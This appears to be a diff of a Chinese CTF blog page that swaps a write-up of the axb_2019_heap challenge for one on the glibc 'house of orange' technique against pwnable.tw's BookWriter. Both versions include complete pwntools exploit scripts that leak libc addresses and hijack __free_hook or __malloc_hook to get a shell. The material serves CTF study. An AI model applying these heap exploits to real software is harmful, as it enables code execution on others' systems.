@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                axb_2019_heap
+                                house of orange学习
                             </h1>
                             
                                 <!--en-->
@@ -175,25 +175,19 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-07</a>
+                                Date: <a href="#">2020-09-14</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">4.2
+                                    href="#">9.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">904</a></span>
+                                    <span class="post-words">words:<a href="#">2117</a></span>
                                     
                                         <span class="post-category">
                                 Category:
                                 
-                                <a href="https://l3mon629.github.io/tag/nF1H8dVWQ/">组合攻击</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/Yg2BsmPyIU/">format-string</a>
+                                <a href="https://l3mon629.github.io/tag/MbNBHUbMa/">house系列</a>
                                 
                                 <a href="https://l3mon629.github.io/tag/tc2bM4krw/">heap</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/mizqxcXow6/">unlink</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">off-by-one</a>
                                 
                             </span>
                                         
@@ -205,136 +199,215 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>发现一个很有意思的题目，学到了一些东西，特此记录一下</p>
-<h2 id="逆向">逆向</h2>
-<p>main函数：<br>
-在format_string里面有格式化字符串漏洞<br>
-<img src="https://l3mon629.github.io/post-images/1599466474723.png" alt="" loading="lazy"><br>
-add函数：<br>
-很长，大体意思就是bss段上有一个key，如果key == 43，就可以申请fastbin大小的chunk，否则不可以<br>
-<img src="https://l3mon629.github.io/post-images/1599466507738.png" alt="" loading="lazy"><br>
-get_input里面存在off-by-one漏洞，别的函数就不看了，节省时间<br>
-<img src="https://l3mon629.github.io/post-images/1599466606348.png" alt="" loading="lazy"></p>
+                            <h1 id="house-of-orange">house of orange</h1>
+<p>什么时候用？<br>
+当程序不提供free功能的时候我们选择采用house of orange攻击手法<br>
+作用：经过攻击后得到一个unsorted bin</p>
+<p>仔细回想一下自己所学，在stack中，大部分攻击手法都类似于栈溢出，目的是为了控制ret的返回地址<br>
+在heap中的攻击手法多样，不仅有溢出还有很多攻击手法，但是大多数目的只有一个：控制指针。而free态的堆块天然的给我们提供了一些指针，fastbin的fd，unsorted bin的fd和bk等等等等。通过控制指针，我们可以泄漏内存，可以改写内存，相当于控制了程序的执行流。</p>
+<blockquote>
+<p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的_int_malloc函数中，在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来_int_malloc函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>
+</blockquote>
+<p>这样我们就得到了一个unsorted bin<br>
+不过，我们得满足一些要求：</p>
+<pre><code>1，伪造的 size 必须要对齐到内存页
+2，size 要大于 MINSIZE(0x10)
+3，size 要小于之后申请的 chunk size + MINSIZE(0x10)
+4，size 的 prev inuse 位必须为 1
+</code></pre>
+<h1 id="bookwriter">BookWriter</h1>
+<h2 id="逆向分析">逆向分析</h2>
+<blockquote>
+<p>main函数<br>
+<img src="https://l3mon629.github.io/post-images/1600092542851.png" alt="" loading="lazy"><br>
+read_author函数<br>
+<img src="https://l3mon629.github.io/post-images/1600092572951.png" alt="" loading="lazy"><br>
+add函数，请记住这个count在这里&gt;8<br>
+<img src="https://l3mon629.github.io/post-images/1600092623364.png" alt="" loading="lazy"><br>
+show函数，到了这里，变成数量&gt;7了<br>
+<img src="https://l3mon629.github.io/post-images/1600092712360.png" alt="" loading="lazy"><br>
+edit函数，很诡异的发现有个strlen，存在无00截断漏洞，并且堆块数量&gt;7<br>
+<img src="https://l3mon629.github.io/post-images/1600092800207.png" alt="" loading="lazy"><br>
+edit author函数，同样，框起来的地方也存在无00截断漏洞<br>
+<img src="https://l3mon629.github.io/post-images/1600092862492.png" alt="" loading="lazy"><br>
+bss段上，发现author,heaparray,sizearray是连在一起的<br>
+<img src="https://l3mon629.github.io/post-images/1600092933289.png" alt="" loading="lazy"></p>
+</blockquote>
 <h2 id="思路">思路</h2>
-<p>这个题目在bss上是有heaparray的，但是保护全开，有个format string漏洞<br>
-思路就出来了，我们可以利用格式化字符串泄漏相关地址，然后实施unlink攻击<br>
-我们调试一下，直接定位到printf的位置单步调试<br>
-注意，调试格式化字符串漏洞的时候一定要进入到输入点之前才能确定栈上的位置<br>
-<img src="https://l3mon629.github.io/post-images/1599466836576.png" alt="" loading="lazy"><br>
-tips：在pwndbg里面我们可以利用命令fmtarg来确定是格式化字符串的第几个参数</p>
-<pre><code>fmtarg 0x7ffdb76453e8
+<p>总结一下发现的漏洞点：<br>
+1，strlen和printf(&quot;%s&quot;)的无00截断的漏洞<br>
+2，add函数和show，edit函数中的关于堆块数量的逻辑漏洞</p>
+<p>这两个漏洞可以做到什么呢？<br>
+首先：第一个strlen，如果我们申请0x18的堆块，并且填满所有内容，那么下面的内存布局不是\x00，而是下一个堆块的size，由于不为空，下面的这一条语句，使得我们的size_array的某一个元素扩大，可以实现少量字节的堆溢出</p>
+<pre><code>size_array[v1] = strlen(heap_array[v1]);
 </code></pre>
-<p>main+28的地方发现是第十一个参数，__libc_start_main+20的地方发现是第十五个参数<br>
-但是注意，我们在打格式化的时候，%11p只是取栈的地址，要想取栈地址里面存的值要用$p<br>
-利用main+28可以泄漏出heaparray的地址，具体做法如下</p>
-<pre><code>.text:000000000000116A
-.text:000000000000116A ; int __cdecl main(int argc, const char **argv, const char **envp)
-.text:000000000000116A                 public main
-.text:000000000000116A main            proc near               ; DATA XREF: _start+1D↑o
-.text:000000000000116A
-</code></pre>
-<p>可以看到在开启pie的情况下main的相对加载位置在0x116A处</p>
-<pre><code>.bss:0000000000202060                 public note
-.bss:0000000000202060 note            db    ? ;               ; DATA XREF: add_note+DA↑o
-.bss:0000000000202060                                         ; add_note+F4↑o ...
-</code></pre>
-<p>heaparray位于0x202060处，所以heaparray在被加载进内存的地址就等于(main+28)-28-0x116A+0x202060的地址<br>
-利用__libc_start_main来泄漏libc的地址</p>
-<p>思路就是申请三个chunk，然后利用off-by-one溢出一个字节unlink到heaparray，然后改写__free_hook为system<br>
-为什么不改写__malloc_hook呢？？因为程序内部存在检查，如果改写malloc相关的函数会报出&quot;no hacker&quot;之类的字符串<br>
-为什么不改写free呢？？因为调试发现会crash掉</p>
-<p>tips：unlink的时候注意</p>
-<pre><code>chunk0
-chunk1
-chunk2
-</code></pre>
-<p>我们通常是先构造fakechunk，然后free(1)，但是我们伪造的fd和bk注意是heaparray[0] - 0x18和0x10的位置</p>
-<p>本地能打通，远程一直报timeout的错误，用别人的脚本也这样，愁人</p>
+<p>第二：printf(&quot;%s&quot;)无00截断，由于author就在heaparray的上方，我们同样的填满author中的内容，可以泄漏出第一个堆块即heaparray[0]的地址</p>
+<p>第三：由于add函数中存在count可以多申请一个，即在add函数里面我们可以申请0-8共九个堆块，但是heaparray的大小是8，所以我们的第九个堆块的地址会被记录在sizearray里面，造成了一个威力极大的堆溢出</p>
+<blockquote>
+<p>总思路：利用house of orange得到一个unsorted bin，由于edit author的存在使bss段可写，我们便可以在bss段上伪造一个size能够覆盖heaparray的unsorted bin，然后申请过来，便可以控制heaparray，然后打__malloc_hook<br>
+利用漏洞一，我们可以改写topchunk的size，然后申请一个比topchunk大的堆块，实现house of orange，得到一个unsorted bin，然后申请一个小chunk，由于是从unsorted bin里面切下来的，我们就可以show这个小chunk来泄漏libc基址<br>
+<img src="https://l3mon629.github.io/post-images/1600094635090.png" alt="" loading="lazy"><br>
+利用漏洞三，我们申请九次chunk，可以获得一个超大溢出的能力，溢出到unsorted bin（原先的top chunk），然后改写fd和bk，使得真unsorted bin位于队列的前一个位置<br>
+<img src="https://l3mon629.github.io/post-images/1600094778672.png" alt="" loading="lazy"></p>
+</blockquote>
+<p>利用编辑作者和漏洞二的功能，在bss段伪造一个unsorted bin，同时设置好fd和bk。借助漏洞二可以泄漏heap[0]的基地址，可以辅助来设置fd和bk(当然，设置成main_arena+88也可以，只要设置heap段的那个unsorted bin里面的bk为伪造的unsorted bin即可)<br>
+<img src="https://l3mon629.github.io/post-images/1600094940993.png" alt="" loading="lazy"></p>
+<p>再次利用漏洞一，为了能够再次申请chunk，我们利用编辑功能，编辑0号chunk，的第一个内容为\x00，这样可以欺骗strlen，将sizearray[0]即heaparray[8]设置为0，我们获得无限申请堆块的能力</p>
+<p>申请合适大小的堆块，使得fake unsorted bin脱链，使我们获得在bss段上写入的能力。<br>
+写入payload，控制heaparray，攻击__malloc_hook为system地址</p>
+<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1600095037803.png" alt="" loading="lazy"></figure>
 <h2 id="exp">exp</h2>
 <pre><code class="language-python">from pwn import *
 
-local = 0
-if local == 1:
-	p = process('./axb_2019_heap')
-else:
-	p = remote('node3.buuoj.cn',28566)
+local = 1
 
-elf = ELF('./axb_2019_heap')
-libc = ELF('./libc.so.6')
+if local == 1:
+	p = process('./bookwriter')
+else:
+	p = remote('chall.pwnable.tw',10304)
+
+elf = ELF('./bookwriter')
+libc = ELF('./libc-2.23.so')
 
 def dbg():
 	context.log_level = 'debug'
 
-def fmt(name):
-	p.recvuntil('Enter your name:')
-	p.sendline(name)
+def author(name):
+	p.sendafter('Author :',name)
 
-def add(index,size,content):
-	p.sendlineafter('&gt;&gt; ','1')
-	p.sendlineafter('Enter the index you want to create (0-10):',str(index))
-	p.sendlineafter('Enter a size:',str(size))
-	p.sendlineafter('Enter the content:',content)
+def add(size,content):
+	p.sendlineafter('Your choice :','1')
+	p.sendlineafter('Size of page :',str(size))
+	p.sendafter('Content :',content)
 
-def free(index):
-	p.sendlineafter('&gt;&gt; ','2')
-	p.sendlineafter('Enter an index:',str(index))
+def show(index):
+	p.sendlineafter('Your choice :','2')
+	p.sendlineafter('Index of page :',str(index))
 
 def edit(index,content):
-	p.sendlineafter('&gt;&gt; ','4')
-	p.sendlineafter('Enter an index:',str(index))
-	p.sendafter('Enter the content:',content)
+	p.sendlineafter('Your choice :','3')
+	p.sendlineafter('Index of page :',str(index))
+	#p.sendafter('Content :',content)
+	p.recvuntil('Content:')
+	p.send(content)
 
+def edit_author(main_arena_88):
+	p.sendlineafter('Your choice :','4')
+	p.recvuntil('Author :')
+	p.recvuntil(b'A' * 64)
+	leak_heap = u64(p.recvuntil('\x0a',drop = True)[-4:].ljust(8,b'\x00'))
+	p.sendlineafter('Do you want to change the author ? (yes:1 / no:0)','1')
+	payload = b'/bin/sh\x00'+p64(0x111)+p64(leak_heap+0x130)+p64(main_arena_88)+p64(0)*4
+	p.sendafter('Author :',payload)
+	return leak_heap
+
+print(&quot;============ bss ============ &quot;)
+print(&quot;[*] the 'author' is in 0x602060  &quot;)
+print(&quot;[*] heaparray[] is in 0x6020A0&quot;)
+print(&quot;[*] sizearray[] is in 0x6020E0&quot;)
+print(&quot;============ bss ============ &quot;)
+
+author(b'A' * 64)
+add(0x18,b'A' * 0x18)	#0
+print(&quot;now we still don't use the fun 'edit',so we dont't use strlen&quot;)
+print(&quot;the next,we use strlen&quot;)
 #dbg()
-print(&quot;======= step 1 : by use fmtstr leak address libc + bss =======&quot;)
-fmt('%11$p%15$p')
-p.recvuntil('Hello,')
-main = int(p.recv(15),16) - 28
-__libc_start_main = int(p.recv(15),16) - 240
-print(&quot;main ---&gt; &quot; + hex(main))
-print(&quot;__libc_start_main ----&gt; &quot; + hex(__libc_start_main))
+print(&quot;========= step 1: make top chunk into unsorted bin ============ &quot;)
+edit(0,b'A' * 0x18)	
+print(&quot;Now, we successfully have haven 3 bytes to overflow&quot;)
+#dbg()
+payload = b'\x00' * 0x18 + b'\xe1\x0f\x00'
+edit(0,payload)
+context.log_level = 'info'
 
-heaparray = main - 0x116A + 0x202060
-print(&quot;heaparray in bss(DATA) ----&gt; &quot; + hex(heaparray))
-libc_base = __libc_start_main - libc.sym['__libc_start_main']
-print(&quot;libc base ----&gt;&quot; + hex(libc_base))
+add(0x1fe1,'A')	#1
 
-add(0,0x98,'A')		#chunk0
-add(1,0xa0,'B')		#chunk1
-add(2,0x90,'/bin/sh\x00')	#chunk2
+print(&quot;======== step 2: leak libc address and the heap address =========== &quot;)
+add(0x10,'A')	#2
+show(2)
 
-print(&quot;======== step 2: unlink =========&quot;)
-fd = heaparray - 0x18
-bk = heaparray - 0x10
-chunk0 = p64(0) + p64(0x91) + p64(fd) + p64(bk) +p64(0) * 14 + p64(0x90) + p64(0xb0)
-edit(0,chunk0)
-free(1)
+#main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 1569
+#print('main_arena leak ---&gt;  ' + hex(main_arena))
+#p.recv()
 
-print(&quot;======= step 3: attack __free_hook ======&quot;)
-free = libc_base + libc.symbols['__free_hook']
-system = libc_base + libc.symbols['system']
+libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x39c141    #- 88 - 0x10 - libc.sym['__malloc_hook']
+print('[*] libc_base ----&gt; ',hex(libc_base))
 
-payload = p64(0) * 3 + p64(free) + p64(0x8) + b'\n'
-print(&quot;这里写入8是因为我们要在bss上伪造chunksize，我们需要写入8字节的payload，即下文的p64(system)&quot;)            
+
+for i in range(6):
+	add(0x10,'A')
+
+
+main_arena_88 = libc_base + 0x39bb78
+print(&quot;forge unsorted bin in author(bss) to control the heaparray &quot;)
+
+heap_addr = edit_author(main_arena_88)
+print('[*] the heaparray[0] ------&gt; ',hex(heap_addr))
+
+print(&quot;=========== step 3: control the heaparray ============ &quot;)
+print(&quot;to emptify the heaparray[8] (sizearray[0]) ,so we can continue to malloc &quot;)
+
+edit(0,p64(0))
+#dbg()
+add(0x30,'AAAAAAAA')
+author_fake_unsorted_bin = 0x602060
+payload = 0x130 * b'\x00' + p64(0) + p64(0x21) + p64(main_arena_88) + p64(author_fake_unsorted_bin)
+
 edit(0,payload)
 
-payload = p64(system)
-print(hex(system))
+__malloc_hook = main_arena_88 - 88 -0x10
+system_addr = libc_base + 0x3f550
 
-#dbg()
-edit(0,payload)
+add(0x100,48*b'a' + p64(__malloc_hook - 8))
+edit(0,p64(0) + p64(system_addr))
 
-p.sendline('2')	
-p.sendline('2')
+p.recvuntil('Your choice :')
+p.sendline('1')
+
+p.recvuntil('Size of page :')
+p.sendline(str(author_fake_unsorted_bin))
+
 p.interactive()
 </code></pre>
+<p>收获几个点：<br>
+1，一个chunk放入unsorted bin链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此unsorted bin遍历堆块的时候使用的是bk指针。<br>
+2，malloc过程复习</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+	void *p,*q;
+	p = malloc(0x1000);
+	malloc(0x10);
+	q = malloc(0x800);
+	malloc(0x20);
+	free(p);
+	free(q);
+	malloc(0x500);
+	malloc(0x500);
+}
+</code></pre>
+<p>过程分析：执行完free后p和q都在unsorted bin里，p是头部，q是尾部。<br>
+malloc(0x500)时，unsorted bin从q开始遍历，将q和p放到large bins里，然后从large bins里切割q，将剩下的部分再次链入unsorted bin。此时p在large bins，q在unsorted bin。<br>
+再次malloc(0x500)时，unsorted bin开始遍历，q不满足要求，被放入small bins，p满足，切割后被放入unsorted bin里，所以最终结果是p在unsorted bin，q在small bins里。<br>
+3，关于题目的一些tips，不泄漏堆地址也可以，我们只需要将real unsorted bin的bk改为fake unsorted bin的地址就可以了。<br>
+关于__malloc_hook，其实一开始不太理解为什么__malloc_hook可以改为system拿shell，翻了一下源码发现__malloc_hook其实是有参数的，第一个参数是size，第二个参数是指针。但是并没有审到什么时候调用这两个参数，在exp中，我们最后利用__malloc_hook(address)，__malloc_hook的地址被改成了system，address指向的内容是/bin/sh，具体malloc的时候，address是作为size传进去的。个人猜测这个方法不常见的原因大概是大多数的题目对malloc的size是有界限的，不允许malloc大size(address一般都是非常大的值)</p>
+<blockquote>
+<p>参考链接：<br>
+深入理解unsorted bin attack：https://xz.aliyun.com/t/7251<br>
+glibc源码：https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3034<br>
+ctf-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/</p>
+</blockquote>
 
                         </div>
                         
                             <div class="post-toc">
                                 <ul class="markdownIt-TOC">
-<li>
+<li><a href="#house-of-orange">house of orange</a></li>
+<li><a href="#bookwriter">BookWriter</a>
 <ul>
-<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
+<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90">逆向分析</a></li>
 <li><a href="#%E6%80%9D%E8%B7%AF">思路</a></li>
 <li><a href="#exp">exp</a></li>
 </ul>
@@ -354,7 +427,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/axb_2019_heap/">https://l3mon629.github.io/post/axb_2019_heap/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/house-of-orange-xue-xi/">https://l3mon629.github.io/post/house-of-orange-xue-xi/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -369,9 +442,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/axb_2019_heap/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/axb_2019_heap/&sharesource=qzone&title=axb_2019_heap&pics=https://l3mon629.github.io/images/avatar.png?v=1600096107633&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/axb_2019_heap/&sharesource=weibo&title=axb_2019_heap + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600096107633 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/house-of-orange-xue-xi/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/house-of-orange-xue-xi/&sharesource=qzone&title=house of orange学习&pics=https://l3mon629.github.io/images/avatar.png?v=1600096107633&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/house-of-orange-xue-xi/&sharesource=weibo&title=house of orange学习 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600096107633 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -381,24 +454,12 @@ p.interactive()
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://l3mon629.github.io/tag/nF1H8dVWQ/">#
-                                                组合攻击
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/Yg2BsmPyIU/">#
-                                                format-string
+                        <a href="https://l3mon629.github.io/tag/MbNBHUbMa/">#
+                                                house系列
                                                     </a>
                                                     
                         <a href="https://l3mon629.github.io/tag/tc2bM4krw/">#
                                                 heap
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/mizqxcXow6/">#
-                                                unlink
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">#
-                                                off-by-one
                                                     </a>
                                                     
                                                         
@@ -414,13 +475,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/buu-pwn2/">
-                                                                                            buu-pwn(2)
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/">
-                                                                                                    PHP面向对象学习
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/cao-zuo-xi-tong/">
+                                                                                                    操作系统
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
